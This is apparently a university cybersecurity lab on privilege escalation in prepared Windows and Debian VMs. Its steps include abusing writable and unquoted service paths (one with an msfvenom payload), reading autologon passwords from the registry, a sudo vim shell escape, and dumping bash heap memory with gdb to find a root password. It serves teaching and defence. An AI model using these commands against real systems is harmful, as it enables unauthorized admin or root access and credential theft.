# Lab 4: Privilege Escalation

{% hint style="danger" %}
READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
{% endhint %}

## 4.1. Introduction

You will need your Kali VM, Windows VM, and the DebLinux VM.&#x20;

* A copy of the DebLinux image (.ova) can be found here: [Pre-built Debian Linux VM](https://drive.google.com/file/d/0B6EDpYQYL72rQ2VuWS1QR2ZsUlU/view?resourcekey=0-JgB-ugTWuHTZqjHvKTM9yg)&#x20;
  * non-admin user: `user`:`password321`&#x20;
  * admin user.       : `root`:`password123`

{% hint style="info" %}
The OVA and UTM copies are also available on Teams for this DebLinux VM.
{% endhint %}

### 4.1.1 Windows VM Setup

If you haven't done already, set up a Windows VM (tested with Windows 11 preview version, but if issues, you should be able to do it with a Windows 7 VM) as described in [Lab 2](https://uwacyber.gitbook.io/cits3006/cits3006-labs/lab-2-malware#2.0.-setup-windows-vm). Once you have created an admin account and are now able to access the desktop, complete the following steps:

1. Log in to the Windows VM using a user account that has administrator privileges.
2. Ensure the Windows VM does not have a user account named 'hank'. If it exists, you can either delete it, or replace 'hank' below with your chosen username, and also replace it in the script in step 3 below.
3.  Download the setup script on the Windows VM (the Desktop directory is fine).&#x20;

    ```powershell
    wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/wsetup.bat -o wsetup.bat
    ```
4. Right-click on the copied setup file and ensure to select from the pop-up menu 'run as Administrator'. This will set up the Windows system for the subsequent exercises.
5. Take note of the resulting output. One of the executed tasks is to create a new user account `hank` with password `password321`.

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Restart the Windows VM and log in to `hank`.

## 4.2 Windows Privilege Escalation

### 4.2.1 Insecure Service Permissions

Each service has an Access Control List (ACL) that specifies specific permissions to a certain service.

Some permissions are pretty harmful, such as:

* able to query the configuration of the service: `sc qc <service>`
* able to check the current status of the service: `sc query <service>`
* able to start and stop the service: `net start/stop <service>`
* and change the configuration of the service: `sc config <service> <option>= <value>`

{% hint style="info" %}
you might need to type `sc.exe` instead of just `sc`. `sc` stands for Service Control, which is a command that you can use to interact with Windows Services.
{% endhint %}

If a user has permission to change the configuration of a service that runs with SYSTEM privileges, we can change the executable the service uses to one of our own, including a reverse shell. Let's discover the running services with any service enumeration tool, such as [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) or by typing `Get-Service`. You will find an exhaustive list of services, one of which is the `daclsvc` service.

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

We'll need a tool named `AccessChk`, which you can download from the official Microsoft site:

```
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
```

Or a copy from our github repo:

```powershell
wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/AccessChk.zip -o accesschk.zip
```

Once downloaded, extract the files.

The tool `AccessChk` is used to check the permissions of user accounts, which is good for administrative tasks, but also could leak useful information for adversaries.

Using the `accesschk.exe` tool, you can look at which services the user `hank` has permissions over (read the documentation to understand the meaning of flags):

```powershell
.\accesschk64.exe -uwcqv "hank" *
```

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

We've confirmed that `hank` has RW (read-write) permissions over the `daclsvc` service (in fact, this is the only service that `hank` has permission to do with), including the `SERVICE_CHANGE_CONFIG` permission which grants the caller the right to change the executable file that the system runs. Thus, this permission should be granted only to administrators. What we can do now is elevate the permissions of this user to the administrator through this misconfigured service. We first check our current group membership for `hank`:

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

We first have to stop the service we wish to modify:

```powershell
net stop daclsvc
```

Now we execute the command to add `hank` to the administrators group:

```powershell
sc config daclsvc binPath= "net localgroup administrators hank /add"
```

{% hint style="info" %}
Note the space after `binPath=`
{% endhint %}

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Now restart the service and check whether `hank` has been added to the administrators group or not.

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Using the command `sc qc daclsvc`, we can also see the binary path that we have altered for the `daclsvc` service. Note the BINARY\_PATH\_NAME variable.

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
With this service's misconfigured permissions, we can actually modify the binary path to contain whatever commands we want, such as the running of a reverse shell. You simply change the `binPath=` to be the path to a reverse shell executable, then the reverse shell will start whenever the service is called. You can manually start the service with `net start daclsvc`. Try this out as an exercise!
{% endhint %}

In an admin cmd, run the command `net localgroup administrators hank /delete` to remove the user from the administrators list as a preparation for the next exercises.

### 4.2.2 Unquoted Service Path

Services whose executable path contains spaces and isn't enclosed within quotes can lead to a privilege escalation. When a service is created whose executable path contains spaces and isn’t enclosed within quotes, this leads to a vulnerability known as _Unquoted Service Path_ which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level, which most of the time it is). if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. This can be exploited to execute an arbitrary binary when the vulnerable service starts, which could allow escalating privileges to SYSTEM.

For this exercise, there will be a vulnerable service called `unquotedsvc` in your system. Inspect its configuration with `sc.exe qc unquotedsvc`.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

We see that the binary path is missing the quotations around it. The path here is to the service .exe. Take note of the directory path itself, as this is where we can drop our malicious executables.

We are going to create a malicious executable that takes advantage of this vulnerability. This executable will perform a similar task to 4.2.1; it will grant the user administrator permissions. We will create this .exe in Kali with the command:

```bash
msfvenom -p windows/exec CMD='net localgroup administrators hank /add' -f exe-service -o common.exe
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The name `common.exe` is innocuous enough. Copy this .exe over to the Windows VM and place it within the `C:\Program Files\Unquoted Path Service` directory. In cmd, restart the service via `net stop/start unquotedsvc`.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Once again, confirm that this user's permissions have been elevated via `net localgroup administrators`. You should see `hank` in the administrators list. Of course, you could plant any .exe you wanted, including reverse shells, etc.

### 4.2.3 Password Mining (Registry)

Password mining refers to the process of searching for and enumerating encrypted or clear-text passwords stored in persistent or volatile memory on the target system. In this exercise, we'll try to discover passwords stored in registry keys which may or may not be encrypted. One of these credential sets may have elevated permissions...

One place we can check is the automatic login credentials. Windows allows a user to automate the logging in process by storing passwords and other pertinent information in the registry database. Locate the default credentials using these commands in cmd:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

We see the credentials of our user with non-administrator permissions in plaintext.&#x20;

If there are other services running (e.g., PuTTY, TightVNC, etc.), you could also check the registry entries to see if there are any credentials. Sometimes they may be hashed, but you can use various hash crackers to retrieve the plaintext, if the credentials used are weak!

For example, crack the following credentials:

```
Password: EC84DB8BE7861E4D
PasswordViewOnly: 2B27C004F36D46D0
```

If you are on a Windows machine, check your own registry!

{% hint style="info" %}
We have seen a few different ways a privilege escalation could happen in Windows machines. These are just a few common ones, so you are encouraged to look at other ways that privilege escalation could happen in Windows for your learning purposes.
{% endhint %}

## 4.3 Linux Privilege Escalation&#x20;

For this, we will cover a couple of straightforward yet interesting privilege escalation exploits, which can easily be found still in today's world (even your own system) that could easily be go unnoticed until something goes wrong.

### 4.3.1 Exploiting sudo

We often use sudo to elevate privileges to run certain programs as the root user. In a typical managed environment, you would restrict users from misusing this by only allowing certain programs to be used with sudo. But some programs may have vulnerabilities/misconfigurations that allow users to elevate privilege to gain root access. We will have a look at a simple one - vim.

First, we check which programs could be run with sudo without passwords.

```bash
sudo -l
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

We see a list, and in fact, many of those could be used to launch an elevated shell as a root. For simplicity, we will use vim.

```bash
sudo vim -c '!sh'
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

This launches a shell within vim, allowing you to elevate the privilege!

Now try to see what other programs you can use to elevate the privilege.

### 4.3.2 Memory inspection

Sometimes passwords are cached in memory, which could be revealed by inspecting the memory. For example, if the root user was accessing the mysql database just before you have logged on, and they logged into the database by specifying the credentials with the `-p` flag, then you could discover what the inputted password was. Let's have a look.

We look at the current running processes on the target VM:

```
ps -ef
```

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

There are several processes running, we will inspect the bash process (in the above screenshot, the PID is 2554). Bash is a good choice because the main interaction is largely plaintext. You can look up other processes that could leak passwords in plaintext as well (e.g., telnet, ftp, etc.).

Now to get the memory dump:

```
gdb -p [PID]
info proc mappings
```

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Make note of the start and end memory addresses of the \[heap]. For the above screenshot, they are `0xbf4000` and `0xc3f000`.

Press 'q' to return, then enter:

```
dump memory <OUTPUT_FILE> <START_ADDRESS> <END_ADDRESS>
```

```
#for us we will do
dump mempry /tmp/mem 0xbf4000 0xc3f000
```

This will dump the memory to a file - `/tmp/mem`. The Heap is a dynamic memory used by applications to store global variables. So as long as the memory has not been overridden by another program, then the value that left in the memory could be retrieved.

We can then inspect this file to see if there are any password related things in there:

```
strings /tmp/mem | grep passw
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

We see the credentials `root` and `password123` in plaintext used to login to `mysql`. We can check this, and quickly find that `mysql` isn't running on the host.

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Instead, we try to switch the user to `root` (given the username was `root`), and find that it was successful.

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Because ssh is also running, we can `ssh` into the target host from Kali.

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Voila!

Try to see if you can retrieve any other useful information from memory dumps (whether on the target host, or on your own machine).

## 4.4 Summary

We discovered a few different methods for escalating privilege when you have gained access as a user on a machine. Regardless of which OS you are on, there are always vulnerabilities that can be exploited to gain higher privileges. Therefore, having proper security policies and security reviews is important (for example, misconfigurations are not typically picked up by anti-malware products or firewalls). Using the techniques above, you could also review if you have any misconfigurations that would allow malicious users who may gain access to your machine to elevate the privilege.

Next up, web security.

**Preparation**: We will be using docker to host web services for testing. It should be already loaded on Kali, but if it isn't please have it ready.
